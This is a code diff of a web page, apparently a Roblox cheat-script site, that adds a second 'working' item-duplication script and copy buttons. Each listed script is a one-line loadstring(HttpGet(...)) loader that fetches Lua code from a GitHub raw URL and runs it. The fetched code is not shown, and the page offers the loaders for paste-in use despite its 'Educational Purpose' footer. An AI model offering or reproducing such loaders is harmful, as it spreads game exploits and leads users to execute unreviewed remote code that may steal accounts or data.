@@ -50,8 +50,15 @@ header h1 {
   margin-top: 8px;
 }
 
-.working { background: #1b5e20; color: #8aff8a; }
-.patched { background: #5e1b1b; color: #ff8a8a; }
+.working {
+  background: #1b5e20;
+  color: #8aff8a;
+}
+
+.patched {
+  background: #5e1b1b;
+  color: #ff8a8a;
+}
 
 pre {
   background: #0b0b0b;
@@ -59,6 +66,7 @@ pre {
   border-radius: 8px;
   overflow-x: auto;
   margin-top: 10px;
+  font-size: 13px;
 }
 
 button {
@@ -69,6 +77,10 @@ button {
   background: #ffb703;
   font-weight: bold;
   cursor: pointer;
+}
+
+button:hover {
+  opacity: 0.85;
 }
 
 footer {
@@ -89,17 +101,31 @@ footer {
 
 <div class="container">
 
+  <!-- WORKING SCRIPT 1 -->
   <div class="script-box">
     <div class="script-title">Cookie Scripts Duper (ETFB)</div>
     <span class="status working">Working</span>
 
-<pre id="code">
+<pre id="code1">
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()
 </pre>
 
-<button onclick="copy()">Copy Script</button>
+<button onclick="copy('code1')">Copy Script</button>
   </div>
 
+  <!-- WORKING SCRIPT 2 -->
+  <div class="script-box">
+    <div class="script-title">Cookie Script Token Duper</div>
+    <span class="status working">Working</span>
+
+<pre id="code2">
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()
+</pre>
+
+<button onclick="copy('code2')">Copy Script</button>
+  </div>
+
+  <!-- PATCHED SCRIPT -->
   <div class="script-box">
     <div class="script-title">Escape Tsunami For Brainrot</div>
     <span class="status patched">Patched / Outdated</span>
@@ -107,16 +133,22 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescr
 <pre>
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/lxdyzhub/refs/heads/main/lxdyzhub.lua"))()
 </pre>
+
+<p style="color:#aaa;font-size:13px;margin-top:8px;">
+❌ Script is no longer working
+</p>
   </div>
 
 </div>
 
-<footer>© 2026 Cookie Scripts • Educational Purpose</footer>
+<footer>
+© 2026 Cookie Scripts • Educational Purpose
+</footer>
 
 <script>
-function copy(){
-  navigator.clipboard.writeText(document.getElementById("code").innerText);
-  alert("Copied!");
+function copy(id){
+  navigator.clipboard.writeText(document.getElementById(id).innerText);
+  alert("Script copied!");
 }
 </script>
 
